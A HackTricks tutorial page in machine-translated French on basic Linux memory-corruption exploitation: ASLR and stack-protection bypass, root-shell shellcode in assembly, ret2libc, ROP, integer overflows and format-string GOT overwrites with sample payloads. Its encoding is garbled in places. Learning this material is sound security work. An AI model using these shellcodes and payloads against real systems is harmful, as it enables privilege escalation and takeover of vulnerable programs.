# Linux Exploiting (Basique) (SPA)

## Linux Exploiting (Basique) (SPA)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## **ASLR**

Address Space Layout Randomization

**D√©sactiver la randomisation (ASLR) GLOBALE (root)**:\
echo 0 > /proc/sys/kernel/randomize\_va\_space\
R√©activer la randomisation GLOBALE : echo 2 > /proc/sys/kernel/randomize\_va\_space

**D√©sactiver pour une ex√©cution** (ne n√©cessite pas les droits root) :\
setarch \`arch\` -R ./exemple arguments\
setarch \`uname -m\` -R ./exemple arguments

**D√©sactiver la protection de l'ex√©cution sur la pile**\
gcc -fno-stack-protector -D\_FORTIFY\_SOURCE=0 -z norelro -z execstack exemple.c -o exemple

**Fichier core**\
ulimit -c unlimited\
gdb /exec fichier_core\
/etc/security/limits.conf -> \* soft core unlimited

**Texte**\
**Donn√©es**\
**BSS**\
**Heap**

**Pile**

**Section BSS**: Variables globales ou statiques non initialis√©es
```
static int i;
```
**Section DATA**: Variables globales ou statiques initialis√©es
```
int i = 5;
```
**Section TEXT**: Code instructions (opcodes)

**Section HEAP**: Dynamically allocated buffers (malloc(), calloc(), realloc())

**Section STACK**: The stack (Passed arguments, environment strings (env), local variables...)

## **1. D√âBORDEMENTS DE PILE**

> D√©bordement de tampon, d√©passement de tampon, d√©passement de pile, √©crasement de pile

Segmentation fault: When attempting to access a memory address that has not been assigned to the process.

To obtain the address of a function within a program, you can do:
```
objdump -d ./PROGRAMA | grep FUNCION
```
## ROP

### Appel √† sys\_execve

{% content-ref url="rop-syscall-execv.md" %}
[rop-syscall-execv.md](rop-syscall-execv.md)
{% endcontent-ref %}

## **2.SHELLCODE**

Voir les interruptions du noyau : cat /usr/include/i386-linux-gnu/asm/unistd\_32.h | grep "\_\_NR\_"

setreuid(0,0); // \_\_NR\_setreuid 70\
execve("/bin/sh", args\[], NULL); // \_\_NR\_execve 11\
exit(0); // \_\_NR\_exit 1

xor eax, eax ; nettoyer eax\
xor ebx, ebx ; ebx = 0 car il n'y a pas d'argument √† passer\
mov al, 0x01 ; eax = 1 -> \_\_NR\_exit 1\
int 0x80 ; Ex√©cuter l'appel syst√®me

**nasm -f elf assembly.asm** -> Renvoie un fichier .o\
**ld assembly.o -o shellcodeout** -> Donne un ex√©cutable compos√© du code assembleur et nous pouvons extraire les opcodes avec **objdump**\
**objdump -d -Mintel ./shellcodeout** -> Pour v√©rifier que c'est bien notre shellcode et extraire les opcodes

**V√©rifier que le shellcode fonctionne**
```
char shellcode[] = ‚Äú\x31\xc0\x31\xdb\xb0\x01\xcd\x80‚Äù

void main(){
void (*fp) (void);
fp = (void *)shellcode;
fp();
}<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">‚Äã</span>
```
Pour v√©rifier que les appels syst√®me sont effectu√©s correctement, vous devez compiler le programme pr√©c√©dent et les appels syst√®me doivent appara√Ætre dans **strace ./PROGRAMA\_COMPILADO**

Lors de la cr√©ation de shellcodes, vous pouvez utiliser une astuce. La premi√®re instruction est un saut vers un appel. L'appel appelle le code d'origine et place √©galement l'EIP dans la pile. Apr√®s l'instruction call, nous avons ins√©r√© la cha√Æne dont nous avions besoin, de sorte qu'avec cet EIP, nous pouvons pointer vers la cha√Æne et continuer √† ex√©cuter le code.

EX **ASTUCE (/bin/sh)**:
```
jmp                 0x1f                                        ; Salto al √∫ltimo call
popl                %esi                                       ; Guardamos en ese la direcci√≥n al string
movl               %esi, 0x8(%esi)       ; Concatenar dos veces el string (en este caso /bin/sh)
xorl                 %eax, %eax             ; eax = NULL
movb  %eax, 0x7(%esi)     ; Ponemos un NULL al final del primer /bin/sh
movl               %eax, 0xc(%esi)      ; Ponemos un NULL al final del segundo /bin/sh
movl   $0xb, %eax               ; Syscall 11
movl               %esi, %ebx               ; arg1=‚Äú/bin/sh‚Äù
leal                 0x8(%esi), %ecx      ; arg[2] = {‚Äú/bin/sh‚Äù, ‚Äú0‚Äù}
leal                 0xc(%esi), %edx      ; arg3 = NULL
int                    $0x80                         ; excve(‚Äú/bin/sh‚Äù, [‚Äú/bin/sh‚Äù, NULL], NULL)
xorl                 %ebx, %ebx             ; ebx = NULL
movl   %ebx, %eax
inc                   %eax                          ; Syscall 1
int                    $0x80                         ; exit(0)
call                  -0x24                          ; Salto a la primera instruci√≥n
.string             \‚Äù/bin/sh\‚Äù                               ; String a usar<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">‚Äã</span>
```
**Exploitation en utilisant le Stack (/bin/sh) :**
```
section .text
global _start
_start:
xor                  eax, eax                     ;Limpieza
mov                al, 0x46                      ; Syscall 70
xor                  ebx, ebx                     ; arg1 = 0
xor                  ecx, ecx                     ; arg2 = 0
int                    0x80                           ; setreuid(0,0)
xor                  eax, eax                     ; eax = 0
push   eax                             ; ‚Äú\0‚Äù
push               dword 0x68732f2f ; ‚Äú//sh‚Äù
push               dword 0x6e69622f; ‚Äú/bin‚Äù
mov                ebx, esp                     ; arg1 = ‚Äú/bin//sh\0‚Äù
push               eax                             ; Null -> args[1]
push               ebx                             ; ‚Äú/bin/sh\0‚Äù -> args[0]
mov                ecx, esp                     ; arg2 = args[]
mov                al, 0x0b                      ; Syscall 11
int                    0x80                           ; excve(‚Äú/bin/sh‚Äù, args[‚Äú/bin/sh‚Äù, ‚ÄúNULL‚Äù], NULL)
```
**EJ FNSTENV:**

EJ FNSTENV est une technique d'exploitation utilis√©e pour exploiter les vuln√©rabilit√©s de la pile d'ex√©cution sur les syst√®mes Linux. Cette technique est bas√©e sur l'utilisation de l'instruction FNSTENV pour obtenir le contexte de la pile d'ex√©cution et extraire les valeurs des registres. Ces valeurs peuvent ensuite √™tre utilis√©es pour analyser et exploiter les vuln√©rabilit√©s pr√©sentes dans le programme cible.

L'exploitation de FNSTENV peut √™tre utilis√©e pour contourner les m√©canismes de protection tels que l'ASLR (Address Space Layout Randomization) et le DEP (Data Execution Prevention). En obtenant les valeurs des registres, un attaquant peut d√©terminer l'emplacement exact de la pile d'ex√©cution et ex√©cuter du code malveillant.

Il est important de noter que l'utilisation de cette technique n√©cessite des connaissances avanc√©es en programmation et en exploitation de vuln√©rabilit√©s. Elle doit √™tre utilis√©e √† des fins l√©gales, telles que les tests de p√©n√©tration autoris√©s et la recherche en s√©curit√© informatique. L'utilisation de cette technique sans autorisation est ill√©gale et peut entra√Æner des cons√©quences juridiques.
```
fabs
fnstenv [esp-0x0c]
pop eax                     ; Guarda el EIP en el que se ejecut√≥ fabs
‚Ä¶
```
**Chasseur d'≈ìufs :**

Il s'agit d'un petit code qui parcourt les pages de m√©moire associ√©es √† un processus √† la recherche de la shellcode qui y est stock√©e (il recherche une signature sp√©cifique dans la shellcode). Utile dans les cas o√π il n'y a qu'un petit espace pour injecter du code.

**Shellcodes polymorphiques**

Il s'agit de shells chiffr√©s qui contiennent un petit code pour les d√©chiffrer et y sauter, en utilisant l'astuce Call-Pop. Voici un **exemple de chiffrement de C√©sar** :
```
global _start
_start:
jmp short magic
init:
pop     esi
xor      ecx, ecx
mov    cl,0                              ; Hay que sustituir el 0 por la longitud del shellcode (es lo que recorrer√°)
desc:
sub     byte[esi + ecx -1], 0 ; Hay que sustituir el 0 por la cantidad de bytes a restar (cifrado cesar)
sub     cl, 1
jnz       desc
jmp     short sc
magic:
call init
sc:
;Aqu√≠ va el shellcode
```
1. **Attaquer le Frame Pointer (EBP)**

Utile dans une situation o√π nous pouvons modifier l'EBP mais pas l'EIP.

Il est connu que lorsqu'une fonction se termine, le code assembleur suivant est ex√©cut√© :
```
movl               %ebp, %esp
popl                %ebp
ret
```
De cette fa√ßon, il est possible de modifier l'EBP en sortant d'une fonction (fvuln) qui a √©t√© appel√©e par une autre fonction, lorsque la fonction qui a appel√© fvuln se termine, son EIP peut √™tre modifi√©.

Dans fvuln, il est possible d'introduire un faux EBP qui pointe vers un emplacement o√π se trouve l'adresse de la shellcode + 4 (il faut ajouter 4 pour le pop). Ainsi, en sortant de la fonction, la valeur de &(\&Shellcode)+4 sera plac√©e dans ESP, avec le pop, 4 sera soustrait √† ESP et il pointera vers l'adresse de la shellcode lors de l'ex√©cution du ret.

**Exploit :**\
\&Shellcode + "AAAA" + SHELLCODE + padding + &(\&Shellcode)+4

**Exploit Off-by-One :**\
Il est possible de modifier uniquement le byte de poids le moins significatif de l'EBP. Une attaque similaire √† celle d√©crite pr√©c√©demment peut √™tre r√©alis√©e, mais la m√©moire qui stocke l'adresse de la shellcode doit partager les 3 premiers octets avec l'EBP.

## **4. M√©thodes return to Libc**

Cette m√©thode est utile lorsque la pile n'est pas ex√©cutable ou laisse peu d'espace pour la modification.

L'ASLR fait en sorte que les fonctions soient charg√©es √† des emplacements diff√©rents en m√©moire √† chaque ex√©cution. Par cons√©quent, cette m√©thode peut ne pas √™tre efficace dans ce cas. Pour les serveurs distants, comme le programme est constamment ex√©cut√© √† la m√™me adresse, cette m√©thode peut √™tre utile.

* **cdecl (C declaration)** : Les arguments sont plac√©s sur la pile et la pile est nettoy√©e apr√®s la sortie de la fonction.
* **stdcall (standard call)** : Les arguments sont plac√©s sur la pile et c'est la fonction appel√©e qui la nettoie.
* **fastcall** : Les deux premiers arguments sont plac√©s dans des registres et les autres sur la pile.

On place l'adresse de l'instruction system de libc et on lui passe en argument la cha√Æne "/bin/sh", g√©n√©ralement √† partir d'une variable d'environnement. De plus, on utilise l'adresse de la fonction exit pour que le programme se termine sans probl√®me une fois que la shell n'est plus n√©cessaire (et pour √©viter d'√©crire des journaux).

**export SHELL=/bin/sh**

Pour trouver les adresses dont nous avons besoin, nous pouvons regarder √† l'int√©rieur de **GDB :**\
**p system**\
**p exit**\
**rabin2 -i executable** ‚Äî> Donne l'adresse de toutes les fonctions utilis√©es par le programme lorsqu'il est charg√©\
(Dans un start ou un autre point d'arr√™t) : **x/500s $esp** ‚Äî> Nous recherchons ici la cha√Æne /bin/sh

Une fois que nous avons ces adresses, l'**exploit** serait le suivant :

"A" \* DISTANCE EBP + 4 (EBP : cela peut √™tre 4 "A" mais il est pr√©f√©rable que ce soit le vrai EBP pour √©viter les erreurs de segmentation) + Adresse de **system** (qui √©crasera l'EIP) + Adresse de **exit** (lorsque system("/bin/sh") se termine, cette fonction sera appel√©e car les 4 premiers octets de la pile sont trait√©s comme l'adresse suivante de l'EIP √† ex√©cuter) + Adresse de "**/bin/sh**" (ce sera le param√®tre pass√© √† system)

De cette mani√®re, l'EIP sera √©cras√© par l'adresse de system, qui recevra la cha√Æne "/bin/sh" en tant que param√®tre, et lorsqu'elle se terminera, la fonction exit() sera ex√©cut√©e.

Il est possible que l'un des octets d'une adresse d'une fonction soit nul ou un espace (\x20). Dans ce cas, il est possible de d√©sassembler les adresses pr√©c√©dant cette fonction, car il y a probablement plusieurs NOPs qui nous permettront d'appeler l'un d'entre eux plut√¥t que la fonction directement (par exemple avec > x/8i system-4).

Cette m√©thode fonctionne car lorsqu'une fonction comme system est appel√©e en utilisant l'opcode **ret** au lieu de **call**, la fonction comprend que les 4 premiers octets seront l'adresse **EIP** √† laquelle revenir.

Une technique int√©ressante avec cette m√©thode consiste √† appeler **strncpy()** pour d√©placer une charge utile de la pile vers le tas, puis utiliser **gets()** pour ex√©cuter cette charge utile.

Une autre technique int√©ressante est l'utilisation de **mprotect()**, qui permet d'attribuer les autorisations souhait√©es √† n'importe quelle partie de la m√©moire. Cela fonctionne ou fonctionnait sur BDS, MacOS et OpenBSD, mais pas sur Linux (qui emp√™che l'attribution simultan√©e des autorisations d'√©criture et d'ex√©cution). Avec cette attaque, il serait possible de r√©tablir l'ex√©cution de la pile.

**Encha√Ænement de fonctions**

Bas√© sur la technique pr√©c√©dente, cette forme d'exploit consiste en :\
Remplissage + \&Fonction1 + \&pop;ret; + \&arg\_fun1 + \&Fonction2 + \&pop;ret; + \&arg\_fun2 + ...

De cette mani√®re, il est possible d'encha√Æner des fonctions √† appeler. De plus, si l'on souhaite utiliser des fonctions avec plusieurs arguments, on peut placer les arguments n√©cessaires (par exemple 4) et rechercher une adresse contenant les opcodes : pop, pop, pop, pop, ret ‚Äî> **objdump -d executable**

**Encha√Ænement en falsifiant les frames (encha√Ænement des EBPs)**

Il s'agit de profiter de la possibilit√© de manipuler l'EBP pour encha√Æner l'ex√©cution de plusieurs fonctions √† travers l'EBP et "leave;ret"

REMPLISSAGE

* On place dans l'EBP un faux EBP qui pointe vers : 2√®me faux EBP + la fonction √† ex√©cuter : (\&system() + \&leave;ret + &"/bin/sh")
* Dans l'EIP, on met comme adresse une fonction &(leave;ret)

On initialise la shellcode avec l'adresse de la partie suivante de la shellcode, par exemple : 2√®me EBP\_falso + \&system() + &(leave;ret;) + &"/bin/sh"

le 2√®me EBP serait : 3√®me EBP\_falso + \&system() + &(leave;ret;) + &"/bin/ls"

Cette shellcode peut √™tre r√©p√©t√©e ind√©finiment dans les parties de m√©moire auxquelles on a acc√®s, de sorte qu'une shellcode facilement divisible en petits morceaux de m√©moire est obtenue.

(L'ex√©cution de fonctions est encha√Æn√©e en m√©langeant les vuln√©rabilit√©s pr√©c√©demment mentionn√©es d'EBP et de ret2lib)
## **5. M√©thodes compl√©mentaires**

**Ret2Ret**

Utiles lorsque vous ne pouvez pas ins√©rer une adresse de la pile dans l'EIP (v√©rifiez que l'EIP ne contient pas 0xbf) ou lorsque vous ne pouvez pas calculer l'emplacement du shellcode. Cependant, la fonction vuln√©rable accepte un param√®tre (le shellcode ira ici).

De cette mani√®re, en changeant l'EIP par une adresse de **ret**, la prochaine adresse sera charg√©e (qui est l'adresse du premier argument de la fonction). Autrement dit, le shellcode sera charg√©.

L'exploit serait: SHELLCODE + Remplissage (jusqu'√† EIP) + **\&ret** (les octets suivants de la pile pointent vers le d√©but du shellcode car l'adresse du param√®tre pass√© est ins√©r√©e dans la pile)

Il semble que des fonctions telles que **strncpy**, une fois termin√©es, suppriment de la pile l'adresse o√π le shellcode √©tait stock√©, rendant cette technique impossible. Autrement dit, l'adresse pass√©e √† la fonction en tant qu'argument (celle qui stocke le shellcode) est modifi√©e par un 0x00, donc lorsque le deuxi√®me **ret** est appel√©, il rencontre un 0x00 et le programme se termine.
```
**Ret2PopRet**
```
Si nous n'avons pas le contr√¥le sur le premier argument mais sur le deuxi√®me ou le troisi√®me, nous pouvons √©craser EIP avec une adresse pop-ret ou pop-pop-ret, selon celle dont nous avons besoin.

**Technique de Murat**

Sur Linux, tous les programmes sont mapp√©s √† partir de 0xbfffffff.

En examinant comment la pile d'un nouveau processus est construite sur Linux, nous pouvons d√©velopper une exploitation de mani√®re √† ce que le programme soit lanc√© dans un environnement dont la seule variable est le shellcode. L'adresse de cette variable peut alors √™tre calcul√©e comme suit : addr = 0xbfffffff - 4 - strlen(NOM\_executable\_complet) - strlen(shellcode)

De cette mani√®re, nous obtenons facilement l'adresse de la variable d'environnement contenant le shellcode.

Cela est possible gr√¢ce √† la fonction execle, qui permet de cr√©er un environnement ne contenant que les variables d'environnement souhait√©es.

**Jump to ESP : Style Windows**

√âtant donn√© que ESP pointe toujours vers le d√©but de la pile, cette technique consiste √† remplacer EIP par l'adresse d'un appel √† **jmp esp** ou **call esp**. Ainsi, le shellcode est sauvegard√© apr√®s l'√©crasement d'EIP, car apr√®s l'ex√©cution de **ret**, ESP pointe vers l'adresse suivante, l√† o√π le shellcode a √©t√© sauvegard√©.

Si ASLR n'est pas activ√© sur Windows ou Linux, il est possible d'appeler **jmp esp** ou **call esp** stock√©s dans un objet partag√©. Si ASLR est activ√©, il est possible de rechercher √† l'int√©rieur du programme vuln√©rable lui-m√™me.

De plus, le fait de pouvoir placer le shellcode apr√®s la corruption d'EIP plut√¥t qu'au milieu de la pile permet d'√©viter que les instructions push ou pop ex√©cut√©es au milieu de la fonction n'interf√®rent avec le shellcode (ce qui pourrait se produire s'il √©tait plac√© au milieu de la pile de la fonction).

De mani√®re similaire, si nous savons qu'une fonction renvoie l'adresse o√π le shellcode est stock√©, nous pouvons appeler **call eax** ou **jmp eax (ret2eax)**.

**ROP (Return Oriented Programming) ou fragments de code emprunt√©s**

Les fragments de code invoqu√©s sont appel√©s gadgets.

Cette technique consiste √† encha√Æner diff√©rents appels de fonctions en utilisant la technique **ret2libc** et l'utilisation de **pop,ret**.

Sur certaines architectures de processeurs, chaque instruction est un ensemble de 32 bits (par exemple, MIPS). Cependant, sur Intel, les instructions ont une taille variable et plusieurs instructions peuvent partager un ensemble de bits, par exemple :

**movl $0xe4ff, -0x(%ebp)** -> Contient les octets 0xffe4, qui se traduisent √©galement par : **jmp \*%esp**

De cette mani√®re, il est possible d'ex√©cuter certaines instructions qui ne sont m√™me pas pr√©sentes dans le programme d'origine.

**ROPgadget.py** nous aide √† trouver des valeurs dans les binaires.

Ce programme permet √©galement de cr√©er les **payloads**. Vous pouvez lui donner la biblioth√®que √† partir de laquelle vous souhaitez extraire les ROP et il g√©n√©rera un payload en python auquel vous fournissez l'adresse de cette biblioth√®que, et le payload est pr√™t √† √™tre utilis√© comme shellcode. De plus, comme il utilise des appels syst√®me, il n'ex√©cute rien r√©ellement dans la pile, mais il enregistre simplement les adresses des ROP qui seront ex√©cut√©es via **ret**. Pour utiliser ce payload, il faut appeler le payload √† l'aide d'une instruction **ret**.

**D√©bordements d'entiers**

Ce type de d√©bordement se produit lorsque une variable n'est pas pr√©par√©e pour supporter un nombre aussi grand que celui qui lui est pass√©, peut-√™tre en raison d'une confusion entre les variables sign√©es et non sign√©es, par exemple :
```c
#include <stdion.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char *argv[]){
int len;
unsigned int l;
char buffer[256];
int i;
len = l = strtoul(argv[1], NULL, 10);
printf("\nL = %u\n", l);
printf("\nLEN = %d\n", len);
if (len >= 256){
printf("\nLongitus excesiva\n");
exit(1);
}
if(strlen(argv[2]) < l)
strcpy(buffer, argv[2]);
else
printf("\nIntento de hack\n");
return 0;
}
```
Dans l'exemple pr√©c√©dent, nous voyons que le programme attend 2 param√®tres. Le premier est la longueur de la cha√Æne suivante et le deuxi√®me est la cha√Æne elle-m√™me.

Si nous passons un nombre n√©gatif comme premier param√®tre, il sera indiqu√© que len < 256 et nous passerons donc cette v√©rification. De plus, strlen(buffer) sera inf√©rieur √† l, car l est un unsigned int et sera tr√®s grand.

Ce type de d√©passement de tampon ne vise pas √† √©crire quelque chose dans le processus du programme, mais √† contourner des filtres mal con√ßus pour exploiter d'autres vuln√©rabilit√©s.

**Variables non initialis√©es**

On ne sait pas quelle valeur peut prendre une variable non initialis√©e et il peut √™tre int√©ressant de l'observer. Il se peut qu'elle prenne la valeur d'une variable de la fonction pr√©c√©dente et soit contr√¥l√©e par l'attaquant.

## **Cha√Ænes de format**

En C, **`printf`** est une fonction qui peut √™tre utilis√©e pour **afficher** une cha√Æne de caract√®res. Le **premier param√®tre** que cette fonction attend est le **texte brut avec les formateurs**. Les **param√®tres suivants** attendus sont les **valeurs** √† **substituer** aux **formateurs** du texte brut.

La vuln√©rabilit√© appara√Æt lorsque le **texte de l'attaquant est mis en tant que premier argument** de cette fonction. L'attaquant pourra cr√©er une **entr√©e sp√©ciale en abusant des capacit√©s de formatage de printf** pour **√©crire n'importe quelle donn√©e √† n'importe quelle adresse**. Ainsi, il pourra **ex√©cuter du code arbitraire**.

Formateurs :
```bash
%08x ‚Äî> 8 hex bytes
%d ‚Äî> Entire
%u ‚Äî> Unsigned
%s ‚Äî> String
%n ‚Äî> Number of written bytes
%hn ‚Äî> Occupies 2 bytes instead of 4
<n>$X ‚Äî> Direct access, Example: ("%3$d", var1, var2, var3) ‚Äî> Access to var3
```
**`%n`** **√©crit** le **nombre d'octets √©crits** √† l'**adresse indiqu√©e**. En √©crivant autant d'**octets** que le nombre hexad√©cimal que nous **devons** √©crire, vous pouvez **√©crire n'importe quelle donn√©e**.
```bash
AAAA%.6000d%4\$n ‚Äî> Write 6004 in the address indicated by the 4¬∫ param
AAAA.%500\$08x ‚Äî> Param at offset 500
```
### GOT (Global Offsets Table) / PLT (Procedure Linkage Table)

C'est la table qui contient l'**adresse** des **fonctions externes** utilis√©es par le programme.

Obtenez l'adresse de cette table avec : **`objdump -s -j .got ./exec`**

![](<../../.gitbook/assets/image (619).png>)

Remarquez comment apr√®s le **chargement** de l'**ex√©cutable** dans GEF, vous pouvez **voir** les **fonctions** qui se trouvent dans le **GOT** : `gef‚û§ x/20x 0xDIR_GOT`

![](<../../.gitbook/assets/image (620) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (5).png>)

En utilisant GEF, vous pouvez **d√©marrer** une **session de d√©bogage** et ex√©cuter **`got`** pour voir la table got :

![](<../../.gitbook/assets/image (621).png>)

Dans un binaire, le GOT contient les **adresses des fonctions ou** de la **section PLT** qui va charger l'adresse de la fonction. L'objectif de cette exploitation est de **modifier l'entr√©e GOT** d'une fonction qui sera ex√©cut√©e ult√©rieurement **avec** l'**adresse** de la PLT de la **fonction `system`**. Id√©alement, vous allez **modifier** le **GOT** d'une **fonction** qui va √™tre **appel√©e avec des param√®tres contr√¥l√©s par vous** (ainsi vous pourrez contr√¥ler les param√®tres envoy√©s √† la fonction syst√®me).

Si la fonction **`system`** n'est **pas utilis√©e** par le script, la fonction system **n'aura pas d'entr√©e dans le GOT**. Dans ce sc√©nario, vous devrez **d'abord obtenir l'adresse** de la fonction `system`.

La **Procedure Linkage Table** est une table **en lecture seule** dans le fichier ELF qui stocke tous les **symboles n√©cessitant une r√©solution**. Lorsqu'une de ces fonctions est appel√©e, le GOT **redirige** le **flux** vers la PLT afin de r√©soudre l'adresse de la fonction et de l'√©crire dans le GOT. Ensuite, la **prochaine fois** qu'un appel est effectu√© √† cette adresse, la fonction est **appel√©e directement** sans avoir besoin de la r√©soudre.

Vous pouvez voir les adresses de la PLT avec **`objdump -j .plt -d ./vuln_binary`**

### **Flux d'exploitation**

Comme expliqu√© pr√©c√©demment, l'objectif va √™tre de **modifier** l'**adresse** d'une **fonction** dans la table **GOT** qui sera appel√©e ult√©rieurement. Id√©alement, nous pourrions d√©finir l'**adresse sur un shellcode** situ√© dans une section ex√©cutable, mais il est tr√®s probable que vous ne puissiez pas √©crire de shellcode dans une section ex√©cutable.\
Une autre option consiste donc √† **modifier** une **fonction** qui **re√ßoit** ses **arguments** de l'**utilisateur** et √† la **rediriger** vers la **fonction `system`**.

Pour √©crire l'adresse, g√©n√©ralement 2 √©tapes sont effectu√©es : vous **√©crivez d'abord 2 octets** de l'adresse, puis les 2 autres. Pour ce faire, on utilise **`$hn`**.

**HOB** est utilis√© pour les 2 octets les plus √©lev√©s de l'adresse\
**LOB** est utilis√© pour les 2 octets les plus bas de l'adresse

Ainsi, en raison du fonctionnement des cha√Ænes de format, vous devez **d'abord √©crire le plus petit** de \[HOB, LOB] puis l'autre.

Si HOB < LOB\
`[adresse+2][adresse]%.[HOB-8]x%[offset]\$hn%.[LOB-HOB]x%[offset+1]`

Si HOB > LOB\
`[adresse+2][adresse]%.[LOB-8]x%[offset+1]\$hn%.[HOB-LOB]x%[offset]`

HOB LOB HOB\_shellcode-8 N¬∫Param\_dir\_HOB LOB\_shell-HOB\_shell N¬∫Param\_dir\_LOB

\`python -c 'print "\x26\x97\x04\x08"+"\x24\x97\x04\x08"+ "%.49143x" + "%4$hn" + "%.15408x" + "%5$hn"'\`

### **Mod√®le d'exploitation des cha√Ænes de format**

Vous pouvez trouver un **mod√®le** pour exploiter le GOT en utilisant les cha√Ænes de format ici :

{% content-ref url="format-strings-template.md" %}
[format-strings-template.md](format-strings-template.md)
{% endcontent-ref %}

### **.fini\_array**

Essentiellement, il s'agit d'une structure avec des **fonctions qui seront appel√©es** avant la fin du programme. C'est int√©ressant si vous pouvez appeler votre **shellcode en sautant √† une adresse**, ou dans les cas o√π vous devez revenir √† la fonction main pour **exploiter la cha√Æne de format une deuxi√®me fois**.
```bash
objdump -s -j .fini_array ./greeting

./greeting:     file format elf32-i386

Contents of section .fini_array:
8049934 a0850408

#Put your address in 0x8049934
```
Notez que cela ne cr√©era pas de boucle infinie car lorsque vous revenez √† la fonction principale, le canary le remarquera, la fin de la pile pourrait √™tre corrompue et la fonction ne sera pas rappel√©e. Ainsi, avec cela, vous pourrez avoir une ex√©cution suppl√©mentaire de la vuln√©rabilit√©.

### Utilisation des cha√Ænes de format pour extraire du contenu

Une cha√Æne de format peut √©galement √™tre utilis√©e pour extraire du contenu de la m√©moire du programme. Par exemple, dans la situation suivante, il y a une variable locale dans la pile qui pointe vers un drapeau. Si vous trouvez o√π se trouve en m√©moire le pointeur vers le drapeau, vous pouvez faire en sorte que `printf` acc√®de √† cette adresse et affiche le drapeau :

Ainsi, le drapeau est √† l'adresse 0xffffcf4c.

![](<../../.gitbook/assets/image (618) (2).png>)

Et √† partir de la fuite, vous pouvez voir que le pointeur vers le drapeau est le 8e param√®tre :

![](<../../.gitbook/assets/image (623).png>)

Donc, en acc√©dant au 8e param√®tre, vous pouvez obtenir le drapeau :

![](<../../.gitbook/assets/image (624).png>)

Notez qu'en suivant l'exploit pr√©c√©dent et en r√©alisant que vous pouvez extraire du contenu, vous pouvez d√©finir des pointeurs vers `printf` dans la section o√π l'ex√©cutable est charg√© et le vider enti√®rement !

### DTOR

{% hint style="danger" %}
De nos jours, il est tr√®s rare de trouver un binaire avec une section dtor.
{% endhint %}

Les destructeurs sont des fonctions qui sont ex√©cut√©es avant la fin du programme. Si vous parvenez √† √©crire une adresse vers un shellcode dans `__DTOR_END__`, cela sera ex√©cut√© avant la fin du programme. Obtenez l'adresse de cette section avec :
```bash
objdump -s -j .dtors /exec
rabin -s /exec | grep ‚Äú__DTOR‚Äù
```
G√©n√©ralement, vous trouverez la section **DTOR** **entre** les valeurs `ffffffff` et `00000000`. Donc, si vous voyez seulement ces valeurs, cela signifie qu'il **n'y a aucune fonction enregistr√©e**. Vous devez donc **√©craser** le **`00000000`** avec l'**adresse** de la **shellcode** pour l'ex√©cuter.

### **Cha√Ænes de format pour les d√©passements de tampon**

La fonction **sprintf** d√©place une cha√Æne format√©e vers une **variable**. Par cons√©quent, vous pouvez exploiter le **formatage** d'une cha√Æne pour provoquer un **d√©passement de tampon dans la variable** o√π le contenu est copi√©.\
Par exemple, la charge utile `%.44xAAAA` √©crira **44 octets+"AAAA" dans la variable**, ce qui peut provoquer un d√©passement de tampon.

### **Structures \_\_atexit**

{% hint style="danger" %}
De nos jours, il est tr√®s **rare d'exploiter cela**.
{% endhint %}

**`atexit()`** est une fonction √† laquelle d'autres fonctions sont pass√©es en tant que param√®tres. Ces **fonctions** seront **ex√©cut√©es** lors de l'ex√©cution d'un **`exit()`** ou du **retour** de la **fonction principale**.\
Si vous pouvez **modifier** l'**adresse** de l'une de ces **fonctions** pour qu'elle pointe vers une shellcode par exemple, vous **prendrez le contr√¥le** du **processus**, mais cela est actuellement plus compliqu√©.\
Actuellement, les **adresses des fonctions** √† ex√©cuter sont **cach√©es** derri√®re plusieurs structures et finalement l'adresse vers laquelle elles pointent n'est pas l'adresse des fonctions, mais elles sont **crypt√©es avec XOR** et des d√©calages avec une **cl√© al√©atoire**. Donc, actuellement, ce vecteur d'attaque n'est **pas tr√®s utile, du moins sur x86** et **x64\_86**.\
La fonction de **cryptage** est **`PTR_MANGLE`**. D'autres architectures telles que m68k, mips32, mips64, aarch64, arm, hppa... **n'impl√©mentent pas la fonction de cryptage** car elle **renvoie la m√™me chose** qu'elle a re√ßue en entr√©e. Donc, ces architectures pourraient √™tre attaqu√©es par ce vecteur.

### **setjmp() & longjmp()**

{% hint style="danger" %}
De nos jours, il est tr√®s **rare d'exploiter cela**.
{% endhint %}

**`Setjmp()`** permet de **sauvegarder** le **contexte** (les registres)\
**`longjmp()`** permet de **restaurer** le **contexte**.\
Les **registres sauvegard√©s** sont : `EBX, ESI, EDI, ESP, EIP, EBP`\
Ce qui se passe, c'est que EIP et ESP sont pass√©s par la fonction **`PTR_MANGLE`**, donc les **architectures vuln√©rables √† cette attaque sont les m√™mes que celles mentionn√©es ci-dessus**.\
